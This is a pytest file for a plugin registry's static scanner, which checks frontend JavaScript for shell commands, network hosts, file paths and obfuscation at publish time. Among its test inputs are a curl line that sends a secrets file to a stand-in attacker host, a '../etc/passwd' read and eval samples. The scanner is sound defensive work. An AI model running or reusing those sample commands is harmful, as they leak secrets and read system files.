"""D-s1: the publish-time static scan of frontend JavaScript (contract 3.8)."""

from __future__ import annotations

import hashlib
import io
import json
import time
import zipfile
from datetime import datetime, timezone

import pytest

from registry.plugin_contract import disclosure_contract, disclosure_scan_contract
from registry.static_scan import js_tokens, scan_package
from registry.static_scan.limits import TooComplex
from registry.static_scan.js_scan import parse_command, scan_script
from tests.conftest import SignedEnv
from tests.fixtures import build_v2_package, contract_manifest

NOW = datetime(2026, 10, 17, tzinfo=timezone.utc)
MANIFEST = {"schemaVersion": 2, "id": "acme.scoped", "version": "1.0.0", "publisher": "acme"}


def _zip(files: dict[str, str | bytes]) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr("manifest.json", json.dumps(MANIFEST))
        for name, data in files.items():
            archive.writestr(name, data)
    return buffer.getvalue()


def _scan(files: dict[str, str | bytes], **kwargs):
    data = _zip(files)
    return scan_package(data, artifact_digest=hashlib.sha256(data).hexdigest(), target="universal",
                        manifest=MANIFEST, now=NOW, **kwargs)


# -- tokenizer ---------------------------------------------------------------


def test_strings_comments_regexes_and_templates_are_told_apart() -> None:
    tokens = js_tokens.tokenize(
        "// 'shell.run' in a comment\n/* \"git push\" */ const r = /git push/g; x = a / 2;\n"
        "t = `git ${b ? `x${c}` : \"}\"} push`; s = '\\x67it'"
    )
    strings = [(t.kind, t.value, t.dynamic) for t in tokens if t.kind in ("str", "tmpl", "regex")]
    assert strings == [
        ("regex", "/git push/g", False),
        ("tmpl", "git  push", True),
        ("str", "git", False),
    ]
    assert [t.escapes for t in tokens if t.kind == "str"] == [1]


@pytest.mark.parametrize("text", ["'unterminated", "`never ${ closed", "/[/", "\\", "a b", "\x00\xff"])
def test_hostile_input_never_raises(text: str) -> None:
    # Only the bounded TooComplex may escape (an unterminated template); the
    # report records it as an incomplete scan (test_static_scan_hardening).
    for run in (lambda: js_tokens.tokenize(text), lambda: scan_script(text, max_path_length=200)):
        try:
            run()
        except TooComplex:
            assert "`" in text


# -- shell -------------------------------------------------------------------


def test_literal_shell_run_commands_are_call_sites() -> None:
    facts = scan_script(
        "await c.invoke('shell.run', { command: 'git push origin main' });"
        "await c.invoke(\"shell.run\", {cwd: '.', command: \"gh api -X POST repos/o/r/issues\"});"
        "run('shell.run', {command: `git status --short`})",
        max_path_length=200,
    )
    assert facts.calls == {
        ("git", "push", "remoteWrite", "callSite"),
        ("gh", "api", "remoteWrite", "callSite"),
        ("git", "status", "local", "callSite"),
    }
    assert facts.dynamic == 0
    assert facts.capabilities == {"shell.run"}


@pytest.mark.parametrize("code", [
    "invoke('shell.run', { command: cmd })",
    "invoke('shell.run', { command: `git ${verb}` })",
    "invoke('shell.run', { command: 'git ' + verb })",
    "invoke('shell.run', { command })",
    "invoke('shell.run', options)",
])
def test_commands_built_at_run_time_are_dynamic(code: str) -> None:
    facts = scan_script(code, max_path_length=200)
    assert facts.dynamic >= 1
    assert not any(evidence == "callSite" for *_rest, evidence in facts.calls)


def test_command_keys_only_count_in_files_that_use_shell_run() -> None:
    facts = scan_script("registerCommand({ command: 'workbench.open', title: 'x' })", max_path_length=200)
    assert facts.calls == set() and facts.dynamic == 0


def test_command_like_strings_are_reported_as_strings_and_never_echo_arguments() -> None:
    facts = scan_script("const a = 'curl -d @secrets https://evil.example/x'; const b = 'git fetch --all'",
                        max_path_length=200)
    assert facts.calls == {("curl", None, "other", "commandLikeString"),
                           ("git", "fetch", "remoteRead", "commandLikeString")}
    assert parse_command("git 'unbalanced") is None
    assert parse_command("/usr/bin/git push") == ("git", "push", "remoteWrite")


# -- network, files, code ----------------------------------------------------


def test_hosts_only_never_paths_or_credentials() -> None:
    facts = scan_script(
        "fetch('https://user:tok@api.example.com/v1/x?token=abc');"
        "const svg = 'http://www.w3.org/2000/svg'; const r = 'git@github.com:o/r.git';"
        "open(`wss://live.example.org/${id}`)",
        max_path_length=200,
    )
    assert facts.hosts == {"api.example.com": 1, "github.com": 1, "live.example.org": 1}


def test_fs_paths_are_read_from_their_call_and_otherwise_counted_as_dynamic() -> None:
    facts = scan_script(
        "invoke('fs.readFile', { path: 'README.md' }); invoke('fs.writeFile', { path: '.navide/devmap.json', data });"
        "invoke('fs.writeFile', { path: dir + '/x' }); invoke('fs.readFile', { path: '../etc/passwd' })",
        max_path_length=200,
    )
    assert facts.read_paths == {"README.md"}
    assert facts.write_paths == {".navide/devmap.json"}
    assert facts.dynamic_paths == 2
    assert facts.capabilities == {"fs.readFile", "fs.writeFile"}


def test_eval_like_code_and_obfuscation_signals() -> None:
    facts = scan_script(
        "eval(x); new Function('a', b); Function(c)(); obj.eval(y); import(name); import('./a.js');"
        "setTimeout('alert(1)', 5); setTimeout(() => 1, 5);"
        + "".join(f"var _0x{n:04x}=1;" for n in range(25)),
        max_path_length=200,
    )
    assert (facts.eval, facts.new_function, facts.dynamic_import, facts.string_timers) == (1, 2, 1, 1)
    assert facts.obfuscation_signals == {"hexIdentifiers"}
    minified = scan_script("!function(e){var t=e.a||{};t.b=function(n){return n*2}}(window);", max_path_length=200)
    assert minified.obfuscation_signals == set()


# -- report ------------------------------------------------------------------


def test_report_shape_and_digest_follow_the_contract() -> None:
    report = _scan({
        "frontend/main/app.js": "invoke('shell.run', {command: 'git push'}); const u = 'https://github.com/o/r';"
                                "invoke('fs.readFile', {path: 'README.md'})",
        "frontend/main/index.html": "<script src=app.js></script>",
        "frontend/main/logo.png": b"\x89PNG",
    })
    assert report is not None
    assert report["scanner"] == {"id": disclosure_scan_contract.SCANNER_ID, "version": "1.0.0"}
    assert report["scannedAt"] == "2026-10-17T00:00:00Z"
    assert report["coverage"] == {
        "filesTotal": 3, "filesScanned": 1, "bytesScanned": report["coverage"]["bytesScanned"],
        "skipped": [{"reason": "binaryAsset", "count": 2}], "truncated": False, "timedOut": False,
    }
    assert report["shell"]["calls"] == [{
        "executable": "git", "subcommand": "push", "category": "remoteWrite",
        "source": "frontend", "evidence": "callSite", "files": 1,
    }]
    assert report["network"]["hosts"] == [{"host": "github.com", "source": "frontend", "count": 1}]
    assert report["files"] == {"readPaths": ["README.md"], "writePaths": [], "dynamicPaths": 0}
    assert report["native"] == [] and report["code"]["backend"] is None
    # The report spells canonically and derives the contract's sentences.
    disclosure_contract.canonical_contract_json(report)
    keys = [s["key"] for s in disclosure_scan_contract.scan_sentences(report)]
    assert keys[0] == "shell.remoteWrite" and keys[-1] == "coverage"


def test_a_command_seen_at_a_call_site_is_not_repeated_as_a_string() -> None:
    report = _scan({"frontend/a.js": "invoke('shell.run', {command: 'git push'}); const s = 'git push origin';"})
    assert [c["evidence"] for c in report["shell"]["calls"]] == ["callSite"]


def test_secret_looking_values_are_dropped_and_counted() -> None:
    token = "gh" + "p_" + "A" * 36
    report = _scan({"frontend/a.js": f"const u = 'https://x.example/'; invoke('fs.readFile', {{path: '{token}'}})"})
    assert report["files"]["readPaths"] == []
    assert token not in json.dumps(report)
    assert {"reason": "redacted", "count": 1} in report["coverage"]["skipped"]


def test_bounds_mark_the_report_incomplete_instead_of_failing() -> None:
    hosts = "".join(f"'https://h{n}.example.com';" for n in range(150))
    report = _scan({"frontend/a.js": hosts})
    assert len(report["network"]["hosts"]) == 100 and report["coverage"]["truncated"] is True

    ticks = iter([0.0, 0.0, 31.0, 31.0, 31.0])
    timed = _scan({"frontend/a.js": "1", "frontend/b.js": "2"}, clock=lambda: next(ticks))
    assert timed["coverage"]["timedOut"] is True
    incomplete = next(s for s in disclosure_scan_contract.scan_sentences(timed) if s["key"] == "coverage.incomplete")
    assert "timedOut" in incomplete["params"]["reasons"]


def test_v1_manifests_get_no_report() -> None:
    data = _zip({"frontend/a.js": "1"})
    assert scan_package(data, artifact_digest="a" * 64, target="universal", manifest={"id": "acme.v1"}) is None


def test_a_large_bundle_scans_within_the_budget() -> None:
    chunk = "function f(a,b){return a.invoke('fs.readFile',{path:'README.md'})+`x${b}`+/re/g.test(b)}\n"
    text = chunk * (2 * 1024 * 1024 // len(chunk))  # ~2 MiB of minified-looking code
    started = time.monotonic()
    report = _scan({"frontend/big.js": text})
    # The budget preempts work inside the file, so even on a loaded machine
    # the call returns in about the budget, with an honest report.
    assert time.monotonic() - started < 40
    assert report is not None
    assert report["coverage"]["timedOut"] is False or report["coverage"]["filesScanned"] == 0


# -- publish -----------------------------------------------------------------


def _publish_signed(env: SignedEnv, package: bytes):
    return env.client.post(
        "/api/publish",
        params={"signature": env.sign(hashlib.sha256(package).hexdigest()), "target": "universal"},
        files={"package": ("plugin.vsix", package, "application/zip")},
        headers={"Authorization": f"Bearer {env.token}"},
    )


def test_publish_signs_the_scan_report_through_scan_digest(signed_env: SignedEnv) -> None:
    manifest = contract_manifest("fs-scopes-declared.json")
    manifest.update(id="acme.scoped", publisher="acme")
    assert _publish_signed(signed_env, build_v2_package(manifest)).status_code == 201
    version = signed_env.client.get("/api/extensions/acme/scoped").json()["versions"][0]
    scan = version["scan"]
    assert scan is not None and scan["artifactDigest"] == version["package_digest"]
    digest = hashlib.sha256(disclosure_contract.canonical_contract_json(scan).encode("ascii")).hexdigest()
    assert version["disclosure_envelope"]["scanDigest"] == digest
